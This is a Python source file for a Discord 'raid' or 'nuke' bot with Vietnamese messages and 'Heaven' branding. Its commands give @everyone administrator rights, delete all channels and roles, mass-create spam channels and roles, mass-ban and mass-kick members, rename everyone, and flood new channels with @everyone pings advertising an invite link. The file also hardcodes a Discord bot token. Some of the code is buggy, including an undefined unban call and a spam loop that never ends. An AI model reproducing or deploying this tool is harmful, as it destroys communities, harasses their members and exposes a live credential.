import os
import discord
from discord.ext import commands
import discord.ext.commands.bot
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import threading
import requests
import sys
import datetime
import json
import aiohttp
import time
from pypresence import Presence
from discord.ext.commands import Bot
import logging
from time import sleep
from os import system


#꒦︶₊꒷˚setting꒦︶₊꒷˚

prefix = "y"
intents = discord.Intents().all() # Set Discord Intents to default
TOKEN = 'MTAwNjk1NjkyNDk1NDIxNDQ5Mg.GIGUpf.8Sj5lBEQwy9ZcxMRVdcAITwUsnMv62aKBq3RhQ' # put ur bot token here, dude



#꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚

client = commands.Bot(command_prefix=prefix, intents=intents)




@client.command()
async def raid(ctx):
  if ctx.author.id:
    guild = ctx.guild
    await ctx.message.delete()
    await ctx.guild.edit(name="Nuked Heaven")
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "Everyone has administrator" +
              Fore.RESET)
    except:
        print(Fore.GREEN + "Everyone hasn't administrator" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} can't delete" + Fore.RESET)
    for member in guild.members:
        try:
            await user.unban(USER_UNBAN)
            print(Fore.MAGENTA +
                  f"{member.name}#{member.discriminator} was unban" +
                  Fore.RESET)
        except:
            print(Fore.GREEN +
                  f"{member.name}#{member.discriminator} can't unban." +
                  Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} can't delete" + Fore.RESET)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"new invite: {link}")
    amount = 1
    for i in range(25):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} sucessfully.")
    return

SPAM_CHANNEL = ["Heaven On The top"]





@client.command()
async def dc(ctx):
      if ctx.author.id:
            guild = client.get_guild(ctx.guild.id)
            for channel in guild.channels:
              try:
                await channel.delete()
                print(f"Deleted channel: {channel}")
              except:
                print(f"Can't delete channel: {channel}")
                pass
    
    

    

@client.command()
async def spamch(ctx):

    if ctx.author.id:
        a = 1
        while a < 200:
            await ctx.guild.create_text_channel("lasthopeonthetop")
            print(f"{a} channels created")
            a += 1
    else:
        pass
#spamchat XD


@client.command()
async def spamrole(ctx):
    if ctx.author.id:
        a = 1
        while a < 100:
            await ctx.guild.create_role(name='Hi')
            print(f"Tạo thành công {a}")
            a += 1
    else:
        pass

#massban
@client.command()
async def massban(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.ban(reason="ăn nuke =))")
        except discord.Forbidden:
            print(f"{member.name} ban thất bại khỏi {ctx.guild.name}")
        else:
            print(f"{member.name} đã bị ban khỏi {ctx.guild.name}")
    await ctx.send("Ban all thành công!")

@client.command()
async def masskick(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.kick()
        except discord.Forbidden:
            print(f"{member.name} kick thất bại khỏi {ctx.guild.name}")
        else:
            print(f"{member.name} đã bị kick khỏi {ctx.guild.name}")
    await ctx.send("Kick mọi người thành công!")

@client.command()
async def spamv(ctx):

    if ctx.author.id:
        a = 1
        while a < 200:
            await ctx.guild.create_voice_channel("Last Hope on top")
            print(f"Đã tạo {a} kênh voice")
            a += 1
    else:
        pass


      

@client.command()
async def perms(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "Mọi người đã có quyền admin" +
              Fore.RESET)
    except:
        print(Fore.GREEN + "Cấp quyền thất bại" + Fore.RESET)      


#/////////////////////////////////



@client.command()
async def nickall(ctx, *, name=".gg/heavenhell"):
  print("Đang đổi tên {member.name}")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 



@client.event
async def on_ready():
    print(f"╔╦╗╔╦═╦══╦══╦═╦═╦╦═╦╦╗╔╦╦═╦═╦══╦╗")
    print(f"║║╚╝║═╣░░║║║║═╣╚╣║║║║║║║╝╔╣═╣░░║║")
    print(f"║║╔╗║═╣╔╗╣║║║═╬╗║║║║║╚╝║╗╚╣═╣╔╗╣║")
    print(f"║╚╝╚╩═╩╝╚╩╩╩╩═╩═╝╚╩═╩══╩╩═╩═╩╝╚╝║")
    print(f"╚═══════════════════════════════╝")
    
    print(f"˳✦₊˚ Cutie bot ˳✦₊˚: {client.user.name}")
    print(f"˳✦₊˚ Him/her id ˳✦₊˚: {client.user.id}")


@client.event 
async def on_guild_channel_create(channel):
    msg = """Nuked by Heaven https://discord.gg/heavenhell @everyone @everyone @everyone @everyone @everyone 

    """
    a = 1
    while a < 20:
        await channel.send(msg)



client.run(TOKEN)

